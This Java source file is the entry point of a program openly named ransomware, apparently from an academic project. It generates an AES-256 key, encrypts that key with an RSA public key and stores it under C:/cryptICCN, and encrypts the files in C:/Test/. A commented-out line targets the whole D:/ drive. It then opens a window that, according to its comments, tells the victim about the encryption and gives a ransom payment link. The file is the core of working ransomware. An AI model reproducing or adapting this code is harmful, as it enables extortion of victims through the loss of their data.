package ma.inpt.iccn.app;

import java.awt.EventQueue;
import java.security.PublicKey;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

import ma.inpt.iccn.crypto.Cryptage;
import ma.inpt.iccn.gui.RansomwareFrame;

public class Application {
	public static void main(String[] args) {
		try {
			/********************************************************************
			 * Génération  de la clé et choix de l'algorithme et mode de cryptage
			 * ******************************************************************/
		      KeyGenerator keyGen;
		      keyGen = KeyGenerator.getInstance("AES");
		      keyGen.init(256);
		      SecretKey cle = keyGen.generateKey();
		      /******************************************************************/
		      
		      
		      /*******************************************************************
		       * Sauvegarde de la clé symétrique dans C:/cryptICCN
		       * Il sera crypté à l'aide de RSA en utilisant la clé public contenu dans le dossier util
		       *******************************************************************/
		      PublicKey publicKey=Cryptage.getClePublic("util/public.key");
		      Cryptage.stockageCleDecryptage(cle);
		      Cryptage.crypterCle(publicKey, "C:/cryptICCN/decrypt.key", "C:/cryptICCN/decrypt.key");
		      /*******************************************************************/
		 
		      
		      /*****************************************************************************
		       * Lancement du ransomware qui va crypter l'ensemble des fichiers des disques
		       * ***************************************************************************/
		      Cryptage.crypterDossier("C:/Test/", cle);
		      //Cryptage.crypterDossier("D:/", cle);
		      /*****************************************************************************/
		      
		      
		      /*********************************************************************************
		       * Lancement de l'interface graphique pour lui signaler le cryptage de ses fichiers
		       * et lui donner le lien de payement de la rançon.
		       * *******************************************************************************/
		      EventQueue.invokeLater(new Runnable() {
					public void run() {
						try {
							RansomwareFrame frame = new RansomwareFrame();
							RansomwareFrame.centreWindow(frame);
							frame.setVisible(true);
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				});
		      /*********************************************************************************/

		    } catch (Exception e) {
		      e.printStackTrace();
		    }
	}
}
